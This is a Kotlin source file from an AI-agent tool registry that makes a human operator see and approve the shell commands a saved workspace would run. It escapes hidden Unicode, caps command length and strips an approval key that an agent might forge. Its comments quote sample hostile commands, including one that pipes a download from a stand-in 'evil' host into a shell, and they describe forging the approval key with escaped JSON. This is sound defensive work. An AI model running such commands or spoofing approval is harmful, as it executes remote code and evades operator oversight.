package ai.rever.boss.mcp

import ai.rever.boss.dashboard.WorkspacePlaceholders
import ai.rever.boss.plugin.api.McpToolArgs
import ai.rever.boss.utils.logging.BossLogger
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.jsonPrimitive

/**
 * Host-internal: a provider with a tool that would run shell commands the call's own arguments
 * do not show, because the arguments only name where the commands are stored.
 *
 * The case that exists today is `open_workspace`: a saved Space's terminal tabs carry an
 * `initialCommand` each, typed into a shell the moment the Space is applied, and an agent that
 * passes the Space's id passes none of them. The provider used to refuse such Spaces outright,
 * because approving `open_workspace(workspaceId = x)` is not approving whatever `x.json` says
 * to run. This seam lets the operator approve exactly that: the registry asks the source for the
 * commands before the prompt, shows them in the approval dialog, asks even where the tool is
 * trusted or allowed, and after approval hands the same list back to the handler under
 * [APPROVED_STORED_COMMANDS_KEY]. That key is the handler's only proof the operator saw the
 * commands, so the registry strips it from whatever the agent sent before anything else looks
 * at the arguments; a handler that finds it there knows the registry put it there.
 *
 * The contract for a source: return the commands the call would run for these arguments, as
 * the operator should read them, or an empty list when it would run none (an unknown id, a
 * shipped template, arguments the handler will refuse anyway). Never run anything, never
 * create anything. Throwing refuses the call: a source that cannot say what would run does not
 * get to run it.
 *
 * Not part of the plugin API on purpose. A plugin's tool receives its arguments and nothing
 * else, and its stored state is its own business; this exists for host-owned tools that apply
 * operator-saved configuration, where the host can vouch for what it read.
 */
interface McpStoredCommandSource {
    suspend fun storedCommandsFor(
        toolName: String,
        args: McpToolArgs,
    ): List<String>
}

/**
 * The argument under which the registry hands an approved list of stored commands to the
 * handler, and which it removes from every incoming call to a [McpStoredCommandSource]'s tool.
 */
internal const val APPROVED_STORED_COMMANDS_KEY: String = "approvedStartupCommands"

/** The most stored commands one call may carry to the prompt; more is refused before it. */
internal const val MAX_STORED_COMMANDS_PER_CALL: Int = 32

/** How long the registry waits for a source to say what a call would run; longer refuses the call. */
internal const val STORED_COMMANDS_PREVIEW_TIMEOUT_MS: Long = 10_000L

/**
 * The longest stored command that can be shown for approval; a longer one refuses the call
 * before any prompt rather than being truncated in the dialog, since an operator cannot approve
 * text they were not shown. Measured on the text as shown ([displayableStoredCommand]), where one
 * hidden code point takes up to ten characters, because what it bounds is what the operator reads.
 */
internal const val MAX_STORED_COMMAND_CHARS: Int = 4096

/**
 * The most text all of one call's stored commands may add up to. The per-command cap alone would
 * still let [MAX_STORED_COMMANDS_PER_CALL] commands of [MAX_STORED_COMMAND_CHARS] each reach a
 * six-line box, and the reason for the per-command cap - an operator cannot approve what they
 * will not read - applies to the total just as much. Measured as shown, like the per-command cap.
 */
internal const val MAX_STORED_COMMANDS_TOTAL_CHARS: Int = 16_384

/**
 * How a stored command is SHOWN, never how it runs: every code point that would change what the
 * operator reads without being visible is replaced by a visible `\u{XXXX}` spelling, so one
 * command is one line whose visible text is all of its text.
 *
 * Decided by Unicode general category rather than a list of ranges, because a range list is out
 * of date the day a character is assigned: controls (Cc: newlines, ANSI escapes), format
 * characters (Cf: bidi overrides and isolates, zero-width characters, the soft hyphen, the tag
 * block U+E0000-E007F), line and paragraph separators (Zl, Zp: U+2028 and U+2029 are mandatory
 * line breaks, so `echo ok<U+2028>2. $ curl ... | sh` would otherwise draw as a second numbered
 * entry), private-use, unpaired surrogates and unassigned code points. A few invisible characters
 * are not in those categories and are named here: the Hangul fillers and the variation selectors.
 * It walks code points, not UTF-16 units, or nothing outside the Basic Multilingual Plane could
 * ever match.
 */
internal fun displayableStoredCommand(command: String): String =
    buildString {
        var i = 0
        while (i < command.length) {
            val cp = command.codePointAt(i)
            if (isHiddenCodePoint(cp)) append("\\u{%04X}".format(cp)) else appendCodePoint(cp)
            i += Character.charCount(cp)
        }
    }

/**
 * Whether the approval dialog can show [command] exactly as it will run.
 *
 * The dialog's text goes through the argument sanitizer like every other agent-reachable text, and
 * a masked command is a command the operator approves without reading:
 * `export TOKEN="$(curl -s https://evil.invalid/x | sh)"` sanitizes to `export [REDACTED]` and
 * would still run in full. So a command the sanitizer would change is refused before the prompt,
 * the same way one too long to show is. A sanitizer that fails answers "no": fail closed.
 */
// runCatching on purpose: this sits before the audit boundary, and a sanitizer failure of any kind
// must refuse the call rather than escape invoke.
internal fun storedCommandShownInFull(command: String): Boolean =
    runCatching { McpArgumentSanitizer.sanitizeMessage(command) == command }.getOrDefault(false)

/**
 * The Space placeholders (`{projectPath}` and the rest) the commands carry, in the order
 * [WorkspacePlaceholders.ALL_PLACEHOLDERS] lists them. The dialog shows commands as the file has
 * them, and these are filled in when the Space is applied (`{projectPath}` shell-quoted), so the
 * operator is told which parts of what they read are not yet the final text.
 */
internal fun storedCommandPlaceholders(commands: List<String>): List<String> =
    WorkspacePlaceholders.ALL_PLACEHOLDERS.filter { placeholder -> commands.any { placeholder in it } }

private val HIDDEN_CATEGORIES: Set<Int> =
    setOf(
        Character.CONTROL.toInt(),
        Character.FORMAT.toInt(),
        Character.LINE_SEPARATOR.toInt(),
        Character.PARAGRAPH_SEPARATOR.toInt(),
        Character.PRIVATE_USE.toInt(),
        Character.SURROGATE.toInt(),
        Character.UNASSIGNED.toInt(),
    )

private fun isHiddenCodePoint(cp: Int): Boolean =
    Character.getType(cp) in HIDDEN_CATEGORIES ||
        cp == 0x115F ||
        cp == 0x1160 ||
        cp == 0x3164 ||
        cp == 0xFFA0 ||
        cp in 0xFE00..0xFE0F ||
        cp in 0xE0100..0xE01EF

private val storedCommandsLogger by lazy { BossLogger.forComponent("McpStoredCommands") }

private val storedCommandsJson = Json { ignoreUnknownKeys = true }

/**
 * The argument tree with [APPROVED_STORED_COMMANDS_KEY] removed. Arguments that are not a JSON
 * object carry no keys and come back unchanged; the handler receives them as it always did.
 */
internal fun McpToolArgs.withoutApprovedStoredCommands(): McpToolArgs {
    // Always parsed, never a substring test first: JSON allows `\u` escapes in object keys, so
    // a key written `\u0061pprovedStartupCommands` is not in the raw text yet decodes to the
    // key the handler reads. The writer and the reader must decide on the same decoded tree.
    val tree = parseObject(raw)
    return if (tree != null && APPROVED_STORED_COMMANDS_KEY in tree) {
        parseMcpToolArgs(JsonObject(tree - APPROVED_STORED_COMMANDS_KEY).toString(), storedCommandsLogger)
    } else {
        this
    }
}

/**
 * The argument tree with [APPROVED_STORED_COMMANDS_KEY] set to [commands], scalar map rebuilt.
 * Arguments that are not a JSON object come back unchanged, as [withoutApprovedStoredCommands]
 * leaves them: there is no object to add the key to, and replacing them would discard what the
 * agent sent. The handler then finds no approval, and refuses a Space that carries commands.
 */
internal fun McpToolArgs.withApprovedStoredCommands(commands: List<String>): McpToolArgs {
    val tree = if (commands.isEmpty()) null else parseObject(raw)
    if (tree == null) return this
    val approved = JsonArray(commands.map { JsonPrimitive(it) })
    val rebuilt = JsonObject(tree + (APPROVED_STORED_COMMANDS_KEY to approved)).toString()
    return parseMcpToolArgs(rebuilt, storedCommandsLogger)
}

/**
 * The commands the operator approved for this call, or `null` when the registry supplied none.
 * Only meaningful inside a handler reached through `McpToolRegistryCore.invoke`, which strips an
 * agent-supplied value before anything reads the arguments. Internal so that no plugin's handler
 * can read the key: a provider outside this module is never a [McpStoredCommandSource], so the
 * registry never writes the key for it, and what it would find there is what the agent sent.
 */
internal fun McpToolArgs.approvedStoredCommands(): List<String>? {
    val approved = parseObject(raw)?.get(APPROVED_STORED_COMMANDS_KEY) as? JsonArray
    return approved?.map { it.jsonPrimitive.content }
}

// Anything a malformed argument string throws means "not an object"; the handler sees the raw text as it always did.
@Suppress("TooGenericExceptionCaught", "SwallowedException")
private fun parseObject(raw: String): JsonObject? =
    try {
        storedCommandsJson.parseToJsonElement(raw) as? JsonObject
    } catch (t: Throwable) {
        null
    }
